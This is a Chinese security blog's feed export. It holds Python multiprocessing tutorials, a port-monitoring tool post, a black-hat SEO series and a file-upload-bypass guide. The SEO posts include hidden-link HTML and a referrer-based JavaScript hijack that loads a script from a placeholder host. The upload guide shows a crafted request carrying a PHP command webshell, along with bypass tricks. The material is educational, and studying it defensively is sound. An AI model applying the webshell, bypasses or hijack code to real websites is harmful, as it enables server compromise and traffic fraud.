    <content type="text"><![CDATA[利用multiprocessing.Process对象可以创建一个进程，该Process对象与Thread对象的用法相同，也有start(), run(), join()等方法。Process类适合简单的进程创建，如需资源共享可以结合multiprocessing.Queue使用；如果想要控制进程数量，则建议使用进程池Pool类。 Process介绍构造方法： Process([group [, target [, name [, args [, kwargs]]]]]) group: 线程组，目前还没有实现，库引用中提示必须是None； target: 要执行的方法； name: 进程名； args/kwargs: 要传入方法的参数。 实例方法： is_alive()：返回进程是否在运行。 join([timeout])：阻塞当前上下文环境的进程程，直到调用此方法的进程终止或到达指定的timeout（可选参数）。 start()：进程准备就绪，等待CPU调度。 run()：strat()调用run方法，如果实例进程时未制定传入target，这star执行t默认run()方法。 terminate()：不管任务是否完成，立即停止工作进程。 属性： authkey daemon：和线程的setDeamon功能一样（将父进程设置为守护进程，当父进程结束时，子进程也结束）。 exitcode(进程在运行时为None、如果为–N，表示被信号N结束）。 name：进程名字。 pid：进程号。 创建多进程的两种方法Process类中，可以使用两种方法创建子进程。 使用Process创建子进程说明：用法与Threading相似 12345678910111213141516171819from multiprocessing import Process #导入Process模块 import os def test(name): ''' 函数输出当前进程ID，以及其父进程ID。 此代码应在Linux下运行，因为windows下os模块不支持getppid() ''' print "Process ID： %s" % (os.getpid()) print "Parent Process ID： %s" % (os.getppid()) if __name__ == "__main__": ''' windows下，创建进程的代码一下要放在main函数里面 ''' proc = Process(target=test, args=('nmask',)) proc.start() proc.join() 使用Process类继承创建子进程说明：通过继承Process类，修改run函数代码。 12345678910111213141516171819202122232425from multiprocessing import Processimport timeclass MyProcess(Process):'''继承Process类，类似threading.Thread''' def __init__(self, arg): super(MyProcess, self).__init__() #multiprocessing.Process.__init__(self) self.arg = arg def run(self): ''' 重构run函数 ''' print 'nMask', self.arg time.sleep(1)if __name__ == '__main__': for i in range(10): p = MyProcess(i) p.start() for i in range(10): p.join() 传送门 【Multiprocessing系列】共享资源【Multiprocessing系列】子进程返回值【Multiprocessing系列】Pool【Multiprocessing系列】Process【Multiprocessing系列】Multiprocessing基础]]></content>
      <categories>
        <category>编程之道</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>Multiprocessing</tag>
        <tag>多进程</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【Multiprocessing系列】Multiprocessing基础]]></title>
    <url>../../../../../../../../2016/11/23/Python-multiprocessing/</url>
    <content type="text"><![CDATA[multiprocessing是Python的标准模块，它既可以用来编写多进程，也可以用来编写多线程。如果是多线程的话，用multiprocessing.dummy即可，用法与multiprocessing基本相同，这里主要介绍多进程的用法，欢迎纠错。 （一）Multiprocessing介绍为什么要使用python多进程？ 因为python使用全局解释器锁(GIL)，他会将进程中的线程序列化，也就是多核cpu实际上并不能达到并行提高速度的目的，而使用多进程则是不受限的，所以实际应用中都是推荐多进程的。 如果每个子进程执行需要消耗的时间非常短（执行+1操作等），这不必使用多进程，因为进程的启动关闭也会耗费资源。 当然使用多进程往往是用来处理CPU密集型（科学计算）的需求，如果是IO密集型（文件读取，爬虫等）则可以使用多线程去处理。 multiprocessing常用组件及功能创建管理进程模块： Process（用于创建进程模块） Pool（用于创建管理进程池） Queue（用于进程通信，资源共享） Value，Array（用于进程通信，资源共享） Pipe（用于管道通信） Manager（用于资源共享） 同步子进程模块： Condition Event Lock RLock Semaphore （二）Multiprocessing进程管理模块说明：由于篇幅有限，模块具体用法结束请参考每个模块的具体链接。 Process模块Process模块用来创建子进程，是Multiprocessing核心模块，使用方式与Threading类似，可以实现多进程的创建，启动，关闭等操作。具体介绍请参考：Process模块介绍 Pool模块Pool模块是用来创建管理进程池的，当子进程非常多且需要控制子进程数量时可以使用此模块。具体介绍请参考：Pool模块介绍 Queue模块Queue模块用来控制进程安全，与线程中的Queue用法一样。 Pipe模块Pipe模块用来管道操作。 Manager模块Manager模块常与Pool模块一起使用，作用是共享资源。 （三）Multiprocessing同步进程模块Lock模块作用：当多个进程需要访问共享资源的时候，Lock可以用来避免访问的冲突。 具体场景：所有的任务在打印的时候都会向同一个标准输出(stdout)输出。这样输出的字符会混合在一起，无法阅读。使用Lock同步，在一个任务输出完成之后，再允许另一个任务输出，可以避免多个任务同时向终端输出。 代码实现：1234567891011from multiprocessing import Process, Lock def l(lock, num): lock.acquire() print "Hello Num: %s" % (num) lock.release() if __name__ == '__main__': lock = Lock() #这个一定要定义为全局 for num in range(20): Process(target=l, args=(lock, num)).start() #这个类似多线程中的threading，但是进程太多了，控制不了。 Semaphore模块作用：用来控制对共享资源的访问数量，例如池的最大连接数。 Event模块作用：用来实现进程间同步通信。 （四）Multiprocessing.dummy多线程Multiprocessing.dummy用法与Multiprocessing用法基本相同，只不过是用来创建多线程。 （五）使用Multiprocessing疑问 启动多进程的代码一定要放在 if name==”main“: 后面吗？ 解答：windows系统下，想要启动一个子进程，必须加上if name==”main“:，linux则不需要。 父进程中的全局变量能被子进程共享吗？ 解答：不行，因为每个进程享有独立的内存数据，如果想要共享资源，可以使用Manage类，或者Queue等模块。 子进程能结束其他子进程或父进程吗？如果能，怎么通过子进程去结束所有进程? 解答：此需求可以稍作修改：所有的子进程都是为了完成一件事情，而当某个子进程完成该事情后，父进程就该结束所有子进程，请问该怎么做？此时结束所有子进程的操作可以交给父进程去做，因为子进程想要结束另外的子进程比较难实现。 那么问题就又变成了父进程什么时候该结束所有进程？ 其中一个思路是获取每个子进程的返回值，一旦有返回True（结束的标记），则立马结束所有进程； 另外一种思路是使用共享资源，父进程可以一直去判断这个公共资源，一旦子进程将它改变，则结束所有子进程。（推荐使用前者，因为多进程中不推荐使用资源共享） 子进程中还能再创建子进程吗？ 解答：可以，子进程可以再创建进程，线程中也可以创建进程。 （六）多进程资源共享问题多进程中不推荐使用资源共享，如果非要使用，可以参考以下链接。 具体介绍请参考：多进程资源共享问题 （七）获取子进程返回值问题多进程中往往会碰到获取子进程返回值的问题，如果遇到问题可以参考以下链接。 具体介绍请参考：获取子进程返回值问题 传送门 【Multiprocessing系列】共享资源【Multiprocessing系列】子进程返回值【Multiprocessing系列】Pool【Multiprocessing系列】Process【Multiprocessing系列】Multiprocessing基础]]></content>
      <categories>
        <category>编程之道</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>Multiprocessing</tag>
        <tag>多进程</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[TcpScanner端口存活探测]]></title>
    <url>../../../../../../../../2016/10/14/TcpScanner端口存活探测/</url>
    <content type="text"><![CDATA[TcpScanner是一款探测服务器端口存活性的扫描工具，它基于TCP扫描，图形化界面管理，主要适用对象为服务器运维人员。一般中小型网络环境，其服务器的数量往往要多于网络设备，尤其是有web业务的公司。对于运维人员来说，必须保证业务不能中断（服务器端口服务正常），而网络中服务器数量往往很庞大，怎样及时发现问题很关键。因此，基于先前编写过的一款TCP扫描工具，略做修改，在此分享。 TcpScanner介绍在介绍工具用法前，我先来说说这款工具的具体功能以及优缺点。先来一张截图：背景金刚狼！ 功能 检测服务器端口存活性 支持nslookup 邮件告警（1.3版本中已加入） 优点 图形化界面，管理方便使用简单 支持批量服务器端口检测 自定义扫描间隔，自定义结果筛选条件 缺点 目前只支持tcp扫描 没有优化，可能存在一些bug TcpScanner用法（1）填写excel先准备一张excel表，填写将要检测的服务器名称、ip、端口、域名。严格按照模板填写，否则可能会使结果不准确，NAME列不要出现重复，如果是同一台服务器，名字可以加以区分。 （2）加载excel运行程序，点击浏览，加载填写完毕的excel文件(最好是.xls文件，xlsx可能会报错)。 （3）检测excel点击检测，程序将对excel填写内容进行检测，如无问题则显示导入excel成功，如有问题则检查excel填写是否有误。 （4）选择参数选择运行间隔、中断筛选参数。注：运行间隔表示多久扫描一次（单位：s），中断筛选表示显示中断几次以上的条目（单位：次）。 （5）开始运行 点击开始按钮，此时正常来说程序开始运行了。程序界面上有三个显示框，从右手边开始，第一个显示所有检测的条目，第二个显示出现中断的条目，第三个显示筛选后最终的条目。 此时，运维人员便可以通过观察最终显示框中是否存在条目，来判断是否有中断的服务了。当然，如果需要运维人员时时看着程序，工作量也很大，所以在此V1.3版本中增加了邮件通知功能，即出现中断服务通过邮件发送告警通知。 注：在程序运行后，出现的条目前面有标注数字，这表示此条目中断的次数，如果恢复了，则数字会减小。 TcpScanner下载（GITHUB源代码下载）：TcPScannerV1.2（百度网盘下载）：TcPScannerV1.2（如果需要1.3版本，可以在博客下方留言） 结语：工具是在2016.2月编写的，现进行了一些小改动，可能存在bug，如出现错误可留言告知，我会尽快修复，谢谢！]]></content>
      <categories>
        <category>安全工具</category>
      </categories>
      <tags>
        <tag>tcpscanner</tag>
        <tag>可用性扫描</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【黑帽SEO系列】暗链]]></title>
    <url>../../../../../../../../2016/10/12/黑帽SEO之暗链/</url>
    <content type="text"><![CDATA[暗链也称为黑链，即隐蔽链接 hidden links，是黑帽SEO的作弊手法之一。在早期的SEO优化中，黑链是最有效最迅速的方法之一；但是现在百度算法已经对iframe和display:none 等直接进行了打击，如果你对代码没有任何处理的话，那么你所做的外链将全部降权。因此，目前黑帽SEO技术中，暗链已经用得不多，但还是有必要了解下这个经典的作弊手法。 挂暗链的目的很简单，增加网站外链，提高网站排名；实现方式主要分为几种：利用CSS实现、利用JS实现、利用DIV+JS实现，其他高级手法。 利用CSS实现挂暗链display属性将display属性设置为none，则页面上不显示此内容。123&lt;div style="display:none;"&gt;&lt;a href=http://thief.one/ &gt;暗链&lt;/a&gt;&lt;/div&gt; 分析：这种形式以前效果较好，现在不建议使用，易被搜索引擎察觉。 color/font-size/line-height属性将color颜色设置与页面背景色一样，大小设置为小于或等于1。1&lt;a href=http://thief.one style="color:#FFFFFF;font-size:1px;line-height:1px ;"&gt;暗链&lt;/a&gt; 分析：最初级的隐蔽链接，易被搜索引擎察觉。 position属性将position位置属性设置成负数，使内容位于页面可见范围以外。1&lt;div style="position: absolute; top: -999px;left: -999px;"&gt;&lt;a href=http://thief.one &gt;暗链&lt;/a&gt;&lt;/div&gt; 1&lt;div style="position:absolute;left:expression_r(1-900);top:expression_r(3-999);"&gt;&lt;a href=http://thief.one &gt;暗链&lt;/a&gt;&lt;/div&gt; 分析：以上2种写法，都是将内容放到可见范围以外，容易被搜索引擎识别。 marquee属性设置marquee滚动标签属性，使之快速闪现。1&lt;marquee height=1 width=5 scrollamount=3000 scrolldelay=20000&gt;&lt;a href=http://thief.one &gt;暗链&lt;/a&gt;&lt;/marquee&gt; 分析：链接以赛马灯形式迅速闪现，这种形式以前效果较好，现在不建议使用。 利用JS实现挂暗链利用js向页面中写入css代码，设置属性。123456789&lt;script language="javascript" type="text/javascript"&gt;document.write("&lt;div style='display:none;'&gt;");&lt;/script&gt;&lt;div&gt;&lt;a href=http://thief.one&gt;暗链&lt;/a&gt;&lt;script language="javascript" type="text/javascript"&gt;document.write("&lt;/div&gt;");&lt;/script&gt; 分析：js输出前面提到的css代码，到达一样的效果。目前来说Google对这种js形式的代码的内部实质意义还无法识别，但也不建议使用这种。 利用DIV+JS实现挂暗链利用div与js功能，修改属性。1234&lt;div id="anlian"&gt;&lt;a href="http://thief.one"&gt;暗链&lt;/a&gt;&lt;/div&gt;&lt;script language=javascript&gt;document.getElementById("anlian").style.display="none"&lt;/script&gt; 分析：这是一种DIV与JS结合做黑链的一种常见方法，蜘蛛一般不会读取script的内容，只会读取div里的链接，可是div的显示属性却被script修改了。 挂暗链高级姿势1234&lt;div class="father" style="position:relative"&gt; &lt;div class="topLever" style="position:absolute;left:0;top:0;z-index:999; width:90%;height:100px;border:1px solid #333;background:#eee"&gt;遮挡层：可以放图片或者Flash&lt;/div&gt; &lt;div class="hideDontent"&gt;隐蔽层：可以放暗链链接&lt;/div&gt;&lt;/div&gt; 分析：这种方式一般是放在Flash、图片或者其它层对象下方。这个代码是用父层相对定位，子层用绝对定位固定住以用来遮挡下面的隐蔽层内的暗链内容。 结语：暗链不是什么新鲜的技术，但黑帽SEO始终在摸索前行，路漫漫其修远兮！ 传送门 【黑帽SEO系列】基础知识【黑帽SEO系列】暗链【黑帽SEO系列】网页劫持【黑帽SEO系列】页面跳转]]></content>
      <categories>
        <category>黑产研究</category>
      </categories>
      <tags>
        <tag>黑帽seo</tag>
        <tag>暗链</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【黑帽SEO系列】网页劫持]]></title>
    <url>../../../../../../../../2016/10/12/黑帽SEO之网页劫持/</url>
    <content type="text"><![CDATA[网页劫持是目前黑帽SEO或者说黑产最喜欢的一种网页引流方式，此手法往往通过入侵政府、教育机构网站（权重高），修改网站源代码、放寄生虫程序、设置二级目录反向代理等实现。网页劫持可以分为服务端劫持、客户端劫持、百度快照劫持、百度搜索劫持等等；表现形式可以是劫持跳转，也可以是劫持呈现的网页内容，目前被广泛应用于私服、博彩等暴利行业。 服务端劫持服务端劫持也称为全局劫持，手法为修改网站动态语言文本，判断访问来源控制返回内容，从来达到网站劫持的目的。 asp/aspx/php劫持 Global.asa、Global.asax、conn.asp、conn.php等文件比较特殊，作用是在每次执行一个动态脚本的时候，都会先加载该脚本， 然后再执行目标脚本。所以只要在 Global.asa 中写判断用户系统信息的代码（访问来源等），如果是蜘蛛访问则返回关键词网页（想要推广的网站），如果是用户访问，则返回正常页面。 客户端劫持客户端劫持的手法也很多，但主要就是2种：js劫持、Header劫持。 js劫持js劫持目的：通过向目标网页植入恶意js代码，控制网站跳转、隐藏页面内容、窗口劫持等。js植入手法：可以通过入侵服务器，直接写入源代码中；也可以写在数据库中，因为有些页面会呈现数据库内容。 js劫持案例效果：通过搜索引擎搜索点击页面（执行一段js）跳转到博彩页面；直接输入网址访问网页，跳转到404页面。代码：1234567891011today=new Date();today=today.getYear()+"-"+(today.getMonth()+1)+"-"+today.getDate();var regexp=/\.(sogou|so|haosou|baidu|google|youdao|yahoo|bing|gougou|118114|vnet|360|ioage|sm|sp)(\.[a-z0-9\-]+)&#123;1,2&#125;\//ig;var where =document.referer;if(regexp.test(where))&#123;document.write ('&lt;script language="javascript" type="text/javascript" src="http://www.xxx.com/test.js"&gt;&lt;/script&gt;');&#125;else&#123;window.location.href="../../404.htm";&#125; 分析：通过referer判断来路，如果referer来路为空就是跳转到404页面，如果是搜索引擎来的referer里面也会有显示，然后在写代码控制跳转。如果只是控制实现显示不同的内容，可以修改php、asp代码；如果需要劫持搜索引擎搜索框，可以写JS代码来做浏览器本地跳转。当然js功能可以无限扩展，比如可以控制一个ip一天内第一次访问正常，其余访问跳转等等。 header劫持在源代码中写入以下代码：1&lt;meta http-equiv=“refresh“ content=“10; url=http://thief.one“&gt; 利用的就是Meta Refresh Tag（自动转向），将流量引走。 手法对比客户端劫持与服务端区别客户端劫持：每次访问网页从服务端获取到的网页代码都是相同的，只是控制了网页代码在浏览器中呈现的效果（比如是否进行跳转等）。服务端劫持：改变了每次访问网页从服务端获取到的网页代码。 客户端劫持与服务端判断方法客户端劫持的判断方法：只需观察浏览器呈现的网页前端代码，查看是否引用了不当的js，或者其它敏感内容。服务端劫持的判断方法：可以通过观察网站后端代码，或者通过改变ip，包头等方式，观察放回源码是否不同。 结语：网页劫持的方法还有很多，我了解的大概只是皮毛，黑帽SEO技术的水很深，前路漫漫。 传送门 【黑帽SEO系列】基础知识【黑帽SEO系列】暗链【黑帽SEO系列】网页劫持【黑帽SEO系列】页面跳转]]></content>
      <categories>
        <category>黑产研究</category>
      </categories>
      <tags>
        <tag>黑帽seo</tag>
        <tag>网页劫持</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【黑帽SEO系列】页面跳转]]></title>
    <url>../../../../../../../../2016/10/10/黑帽SEO之页面跳转/</url>
    <content type="text"><![CDATA[想要更深入地了解黑帽SEO，就必须先了解关于网站的一些基础知识，以及黑帽SEO常见的作弊手法。（可以参考：黑帽SEO–基础知识）其中页面跳转便是作弊手法之一，最近我收集了一些关于页面跳转的相关内容，在此汇总分享。 页面跳转分类（一）服务端跳转 一般用户不会感觉到跳转的实际行为，往往通过代码去控制，因此有些时候我们也不叫做跳转。具体的服务端跳转行为有很多，各个语言技术都有各自的特点。 （二）客户端跳转客户端跳转分为：http层跳转，应用层跳转。应用层跳转分为：html head跳转，js跳转等。 http层跳转 http跳转是指server根据工作情况通过http返回状态码，利用http的重定向协议指示客户端浏览器跳转到相应页面的过程，一般返回码是302。 html head跳转（HTML refresh）在html代码的head中添加特殊标签，如下1&lt;meta http-equiv="refresh" content="5"; url="http://thief.one/" /&gt; 表示：5秒之后转到One Thief首页，这个跳转需要浏览器具体解析html后采能进行。 js跳转通过在html代码中添加js代码，通过js代码实现跳转：123&lt;script language="javascript" type="text/javascript"&gt;window.location.href="http://thief.one";&lt;/script&gt; 这个跳转应该比html head跳转更向后延迟。 各种跳转包含关系 服务端跳转 客户端跳转 http跳转 应用层跳转 html head跳转 html js跳转 各种跳转介绍（一）服务端跳转介绍：跳转发生在服务器上，用户不会有任何感觉。优点：跳转行为在server进行， 一次tcp连接完成相关操作，对用户是透明的，不会造成疑惑。缺点：对用户隐藏了信息，跳转行为都发生在server端，对server有压力。 （二）http跳转介绍：跳转发生在服务端发生数据给客户端过程中，用户能够感觉到，并且状态码往往为302。优点：响应速度快，在http1.1协议下通过合适的设置可以使用同一个tcp连接，节省网络时间，服务器及用户端都不需要进行额外的数据处理工作，节省时间。缺点：仅仅能做跳转没有其他功能，基于js及html的跳转可以选择延时跳转，但是302无法选择延时跳转等。 （三）html head跳转介绍：跳转发生在服务端已经将数据传输到客户端以后，用户能够感觉到。优点：跳转方式灵活，可以指定延时跳转等等缺点：可能多次建立tcp连接，在低速网络下效率更低，浪费客户端的时间。 （四） js跳转介绍：跳转发生在服务端已经将数据传输到客户端以后，用户能够感觉到优点：跳转方式灵活，可以指定延时跳转等等缺点：可能多次建立tcp连接，在低速网络下效率更低，浪费客户端的时间。 参考文章：http://www.iigrowing.cn/欢迎留言交流补充! 传送门 【黑帽SEO系列】基础知识【黑帽SEO系列】暗链【黑帽SEO系列】网页劫持【黑帽SEO系列】页面跳转]]></content>
      <categories>
        <category>黑产研究</category>
      </categories>
      <tags>
        <tag>黑帽seo</tag>
        <tag>页面跳转</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【黑帽SEO系列】基础知识]]></title>
    <url>../../../../../../../../2016/10/09/黑帽SEO之基础知识/</url>
    <content type="text"><![CDATA[SEO全称为搜索引擎优化，是指通过站内优化、站外优化等方式，提升搜索引擎收录排名。既然有SEO技术，便会有相应的从业人员，他们被称为白帽SEO，专指通过公正SEO手法，帮助提升站点排名的专业人员。 当然有白便会有黑，由于白帽SEO优化的过程将会十分漫长，一个新站想要获取好的排名，往往需要花上几年时间做优化推广。因此一些想要快速提升自身网站排名的小伙伴，便开始在SEO上研究作弊手法，从而诞生了黑帽SEO。黑帽SEO是指通过作弊手段，让站点快速提升排名的一类SEO技术，或者说是黑客技术，比如说：黑链（暗链）、站群、网站劫持、桥页等，黑帽SEO能够快速提升排名，但毕竟是违规作弊行为，容易被K。 白帽与黑帽的优缺点显而易见，换句话说两者皆不完美，因此便又诞生了灰帽SEO，介于两者之间，既不违规，又可以较快速的提升排名。由于项目需要，最近开始接触一些黑帽SEO的知识，在此总结分享，欢迎指正！ 黑帽SEO基础概念域名概念：域名由两个或两个以上的词构成，中间由点号分隔开，最右边的那个词称为顶级域名。 顶级域名我们接触的顶级域名又分为两类：1.国家和地区顶级域名，目前200多个国家分配了顶级域名，例如中国是cn，日本是jp等；2.国际顶级域名，例如表示工商企业的.com，表示网络提供商的.net，表示非盈利组织的.org等。 一级域名一级域名就是在com net org前加一级，比如：baidu.com，thief.one等。 二级域名news.baidu.com，tieba.baidu.com等都是二级域名。 泛站群泛二级域名站群前提：在做域名解析的时候，选择了*操作：进入服务器，可以借助泛二级域名建站工具，批量创建二级域名站点，从而实现站群的效果。 泛端口站群操作：先要获得操作目标站点的服务器权限，进入服务器之后，可以使用泛端口站群建设工具，批量创建泛端口站点。主要是在iis里面批量创建站点，绑定站点对应的端口。对于泛端口站点，一定要注意一些重要端口别占用了，否则可以导致服务器出错。一般泛站，用的比较多的是Dedecms程序。 站中站 就是在权重高的网站中创建一个自己的网站，其实就是添加很多外链，蜘蛛会认为这些网站也是属于高权重网站的内容，因此权重也会比较高。但是由于这种做法太泛滥，导致百度修改了爬虫算法。 链轮 Y是想要推广的网站，W是自己控制的外部网站，首先可以搞多个网站，一层层外链下去，形成链轮。当想要推广某个网站时，可以在所有外部网站上添加Y的外链。谷歌貌已经对此不友好，百度还可以尝试。 蜘蛛池 蜘蛛池是一种通过利用大型平台权重来获得搜索引擎收录以及排名的一种程序。原理可以理解为事先创建了一些站群，获取（豢养）了大量搜索引擎蜘蛛。当想要推广一个新的站点时，只需要将该站点以外链的形式添加到站群中，就能吸引蜘蛛爬取收录。 寄生虫 寄生虫是黑帽SEO常用的一种方法，通过侵入别人网站，植入寄生虫程序，自动生成各种非法页面。之所以叫做寄生虫是因为能够自己触发生成，而不是一次生成，例如在访问网页的时候触发，自动生成页面且形成链轮等。 黑帽SEO作弊手法SEO作弊手法不仅仅是为了提升网站排名，也有可能是为了陷害对手网站，降低其排名。 PR劫持 往往是利用301或者302跳转，因为搜索引擎在处理301，302跳转时，把目标URL当做实际收录的URL。 即当从A域名302到B域名，而B域名的PR值比较高时，域名A在更新PR值后，也会显示域名B的PR值，也就是说可以提升A的PR值。利用这一点，可以先将自己网站302跳转到一个PR高的网站，等PR值更新后，取消转向，放上自己的内容，这样可以维持到下一次PR值更新，大概两三个月的时间。 网站跳转详细参考：黑帽SEO之页面跳转 隐藏页面 隐藏页面指的是页面使用程序判断访问者是普通用户还是搜索引擎蜘蛛。如果是普通用户，程序返回一个不考虑SEO，只给用户看的页面；如果是搜索引擎蜘蛛，程序就返回一个高度优化的，但是由于优化后无法阅读的页面。 隐藏文字 隐藏文字指的是网页上用户看不到，但搜索引擎能看到的文字，可以通过改变文字颜色，位置，大小等方式，代码：123&lt;div style="display:none"&gt;隐藏文字&lt;/div&gt;positon:absolute;margin-right:-1000000px; 垃圾连接 垃圾连接通常指站长为了提高网站排名，去各大论坛网站留言，留下自己的连接，一般通过群发软件完成这一操作。这种手法，容易被过滤掉，一些浏览器的插件或者博客的插件可以自动进行垃圾留言过滤。 连接农场 链接农场指的是整个网站或者部分网页，没有实质内容，完全是为了交换链接而存在。该页面上全部是链接到其他网站，其他网站再链回来，互相交叉。 桥页 桥页也称为“门页”，此页面质量很低，充斥着关键字，完全以关键词排名与流量为目标，不考虑用户体验。当用户访问桥页，一般会有两种情况。 页面顶部以大字号连接到其他网站（想要推广的网站），用户因为看不清桥页内容，有时不得不点击连接。 利用页面自动跳转技术。 关键词堆积关键词堆积指的是在页面上本来没必要出现关键词的地方反复刻意堆积关键词，提高排名。 诱饵替换诱饵替换指的是作弊者先通过普通关键词制作页面获得排名后，更改为其他内容。 刷站刷站是一种利用程序模拟用户用搜索引擎，搜索某个关键词，然后点击浏览某个网页的行为。 挂暗链（黑链）手法：利用CSS，利用DIV+JS，利用JS等作用：利用高权重网站外链来提升自身站点排名。详细参考：黑帽SEO之暗链 网站劫持分类：客户端劫持，服务端劫持，快照劫持等手法：一般利用js或者php、asp等代码，达到劫持网站，控制跳转以及网页效果呈现的目的。作用：利用高权重网站跳转来引流量。详细参考：黑帽SEO之网页劫持 利用高权重网站二级目录手法：将一些博彩网页放在高权重网站的二级目录之下。作用：提高网站排名，引流量。 利用高权重网站二级目录反向代理 通过配置nginx/apache等，设置目录代理，将服务器上某个目录代理到自己搭建服务器上的某个目录。 即浏览者在打开http://thief.one/2016/目录时，实际访问到的资源是自己服务器上的某个目录（目标服务器会去自己服务器上拿数据），这取决于nginx配置文件的写法。这种手法不需要修改目标服务器网站源码，只需要修改中间件配置文件，不易被删除，不易被发现。 持续更新……. 参考：黑帽SEO论坛、SEO实战密码 传送门 【黑帽SEO系列】基础知识【黑帽SEO系列】暗链【黑帽SEO系列】网页劫持【黑帽SEO系列】页面跳转]]></content>
      <categories>
        <category>黑产研究</category>
      </categories>
      <tags>
        <tag>黑帽seo</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[文件上传漏洞（绕过姿势）]]></title>
    <url>../../../../../../../../2016/09/22/上传木马姿势汇总-欢迎补充/</url>
    <content type="text"><![CDATA[文件上传漏洞可以说是日常渗透测试用得最多的一个漏洞，因为用它获得服务器权限最快最直接。但是想真正把这个漏洞利用好却不那么容易，其中有很多技巧，也有很多需要掌握的知识。俗话说，知己知彼方能百战不殆，因此想要研究怎么防护漏洞，就要了解怎么去利用。此篇文章主要分三部分：总结一些常见的上传文件校验方式，以及绕过校验的各种姿势，最后对此漏洞提几点防护建议。（根据个人经验总结，欢迎补充纠错~~） 文件上传校验姿势 客户端javascript校验（一般只校验后缀名） 服务端校验 文件头content-type字段校验（image/gif） 文件内容头校验（GIF89a） 后缀名黑名单校验 后缀名白名单校验 自定义正则校验 WAF设备校验（根据不同的WAF产品而定） 1.客户端校验 一般都是在网页上写一段javascript脚本，校验上传文件的后缀名，有白名单形式也有黑名单形式。 判断方式：在浏览加载文件，但还未点击上传按钮时便弹出对话框，内容如：只允许上传.jpg/.jpeg/.png后缀名的文件，而此时并没有发送数据包。 2.服务端校验2.1 content-type字段校验 这里以PHP代码为例，模拟web服务器端的校验代码123456789101112131415&lt;?php if($_FILES['userfile']['type'] != "image/gif") #这里对上传的文件类型进行判断，如果不是image/gif类型便返回错误。 &#123; echo "Sorry, we only allow uploading GIF images"; exit; &#125; $uploaddir = 'uploads/'; $uploadfile = $uploaddir . basename($_FILES['userfile']['name']); if (move_uploaded_file($_FILES['userfile']['tmp_name'], $uploadfile)) &#123; echo "File is valid, and was successfully uploaded.\n"; &#125; else &#123; echo "File uploading failed.\n"; &#125; ?&gt; 可以看到代码对上传文件的文件类型进行了判断，如果不是图片类型，返回错误。 2.2 文件头校验 可以通过自己写正则匹配，判断文件头内容是否符合要求，这里举几个常见的文件头对应关系：（1） .JPEG;.JPE;.JPG，”JPGGraphic File”（2） .gif，”GIF 89A”（3） .zip，”Zip Compressed”（4） .doc;.xls;.xlt;.ppt;.apr，”MS Compound Document v1 or Lotus Approach APRfile” 文件上传绕过校验姿势 客户端绕过（抓包改包） 服务端绕过 文件类型 文件头 文件后缀名 配合文件包含漏洞绕过 配合服务器解析漏洞绕过 CMS、编辑器漏洞绕过 配合操作系统文件命名规则绕过 配合其他规则绕过 WAF绕过 1.客户端绕过 可以利用burp抓包改包，先上传一个gif类型的木马，然后通过burp将其改为asp/php/jsp后缀名即可。 2.服务端绕过2.1 文件类型绕过 我们可以通过抓包，将content-type字段改为image/gif123456789101112POST /upload.php HTTP/1.1TE: deflate,gzip;q=0.3Connection: TE, closeHost: localhostUser-Agent: libwww-perl/5.803Content-Type: multipart/form-data; boundary=xYzZYContent-Length: 155--xYzZYContent-Disposition: form-data; name="userfile"; filename="shell.php"Content-Type: image/gif (原为 Content-Type: text/plain)&lt;?php system($_GET['command']);?&gt;--xYzZY- 2.2 文件头绕过 在木马内容基础上再加了一些文件信息，有点像下面的结构GIF89a&lt;?php phpinfo(); ?&gt; 2.3 文件后缀名绕过前提：黑名单校验黑名单检测：一般有个专门的 blacklist 文件，里面会包含常见的危险脚本文件。绕过方法：（1）找黑名单扩展名的漏网之鱼 - 比如 asa 和 cer 之类（2）可能存在大小写绕过漏洞 - 比如 aSp 和 pHp 之类能被解析的文件扩展名列表：jsp jspx jspfasp asa cer aspxphp php php3 php4exe exee 3.配合文件包含漏洞前提：校验规则只校验当文件后缀名为asp/php/jsp的文件内容是否为木马。绕过方式：（这里拿php为例，此漏洞主要存在于PHP中）（1）先上传一个内容为木马的txt后缀文件，因为后缀名的关系没有检验内容；（2）然后再上传一个.php的文件，内容为&lt;?php Include(“上传的txt文件路径”);?&gt;此时，这个php文件就会去引用txt文件的内容，从而绕过校验，下面列举包含的语法：12345678#PHP &lt;?php Include("上传的txt文件路径");?&gt; #ASP &lt;!--#include file="上传的txt文件路径" --&gt;#JSP &lt;jsp:inclde page="上传的txt文件路径"/&gt;or &lt;%@include file="上传的txt文件路径"%&gt; 详细参考：文件包含漏洞(绕过姿势) 4.配合服务器解析漏洞详细可参考：http://thief.one/2016/09/21/服务器解析漏洞/ 5.配合操作系统文件命令规则（1）上传不符合windows文件命名规则的文件名 test.asp. test.asp(空格) test.php:1.jpg test.php::$DATA shell.php::$DATA…….会被windows系统自动去掉不符合规则符号后面的内容。（2）linux下后缀名大小写在linux下，如果上传php不被解析，可以试试上传pHp后缀的文件名。 6.CMS、编辑器漏洞（1）CMS漏洞：比如说JCMS等存在的漏洞，可以针对不同CMS存在的上传漏洞进行绕过。（2）编辑器漏洞：比如FCK，ewebeditor等，可以针对编辑器的漏洞进行绕过。这两方面的漏洞以后单独成文汇总，这里点到为止。 7.配合其他规则（1）0x00截断：基于一个组合逻辑漏洞造成的，通常存在于构造上传文件路径的时候 test.php(0x00).jpg test.php%00.jpg 路径/upload/1.php(0x00)，文件名1.jpg，结合/upload/1.php(0x00)/1.jpg伪代码演示：12345name= getname(httprequest) //假如这时候获取到的文件名是 help.asp.jpg(asp 后面为 0x00)type =gettype(name) //而在 gettype()函数里处理方式是从后往前扫描扩展名，所以判断为 jpgif(type == jpg) SaveFileToPath(UploadPath.name, name) //但在这里却是以 0x00 作为文件名截断//最后以 help.asp 存入路径里 8.WAF绕过8.1 垃圾数据 